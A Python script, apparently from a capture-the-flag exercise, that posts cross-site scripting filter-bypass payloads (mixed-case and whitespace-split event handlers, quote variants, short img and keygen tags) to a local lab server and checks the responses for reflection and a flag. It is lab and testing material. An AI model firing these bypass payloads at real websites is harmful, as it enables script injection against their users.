import requests
import re

target = "http://127.0.0.1:32808"
endpoint = "/page"

def send_payload(payload, test_name):
    data = {'name': payload}
    response = requests.post(target + endpoint, data=data)
    
    has_filter = "Sorry you can't use:" in response.text
    filter_match = re.search(r"Sorry you can't use: '([^']+)'", response.text)
    blocked = filter_match.group(1) if filter_match else None
    
    is_reflected = payload in response.text
    flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
    has_flag = len(flag_matches) > 0
    
    print(f"\n=== {test_name} ===")
    print(f"Payload: {payload}")
    print(f"Status: {response.status_code}")
    print(f"Filter: {has_filter}")
    if blocked:
        print(f"Blocked: '{blocked}'")
    print(f"Reflected: {is_reflected}")
    print(f"Flag: {flag_matches if has_flag else 'None'}")
    
    return {
        'test_name': test_name,
        'payload': payload,
        'has_filter': has_filter,
        'blocked': blocked,
        'is_reflected': is_reflected,
        'has_flag': has_flag,
        'flag_matches': flag_matches
    }

print("="*70)
print("CREATIVE BYPASS ATTEMPTS")
print("="*70)

results = []

# Test 1: Mixed case event handlers to avoid detection
print("\n[+] Testing mixed case event handlers")
mixed_case_tests = [
    ("<img src=x onFoCuS=eval('1+1')>", "onFoCuS mixed"),
    ("<img src=x oNfOcUs=eval('1+1')>", "oNfOcUs random"),
    ("<img src=x OnFoCuS=eval('1+1')>", "OnFoCuS camel"),
    ("<img src=x oNfOcUs=eval('1+1')>", "oNfOcUs weird"),
]

for payload, name in mixed_case_tests:
    results.append(send_payload(payload, name))

# Test 2: Whitespace in event names
print("\n[+] Testing whitespace in event names")
whitespace_tests = [
    ("<img src=x on focus=eval('1+1')>", "space in event"),
    ("<img src=x on\nfOCUS=eval('1+1')>", "newline in event"),
    ("<img src=x on\tFOCUS=eval('1+1')>", "tab in event"),
    ("<img src=x on\rFOCUS=eval('1+1')>", "CR in event"),
]

for payload, name in whitespace_tests:
    results.append(send_payload(payload, name))

# Test 3: Different quote styles
print("\n[+] Testing different quote combinations")
quote_tests = [
    ('<img src=x onfocus=eval("1+1")>', 'double quotes'),
    ("<img src=x onfocus=eval('1+1')>", 'single quotes'),
    ('<img src=x onfocus=eval(`1+1`)>', 'backticks'),
    ("<img src=x onfocus=eval(1+1)>", "no quotes"),
]

for payload, name in quote_tests:
    results.append(send_payload(payload, name))

# Test 4: Ultra-short payloads
print("\n[+] Testing ultra short payloads")
short_tests = [
    ("<img src=x onfocus=alert(1)>", "short alert"),
    ("<img src=x onfocus=eval(1)>", "short eval"),
    ("<img src=x onfocus=throw+1>", "short throw"),
    ("<keygen onfocus=eval(1)>", "keygen minimal"),
]

for payload, name in short_tests:
    results.append(send_payload(payload, name))

# Test 5: Event handlers without blocked letters
print("\n[+] Testing event handlers (checking which work)")
event_tests = [
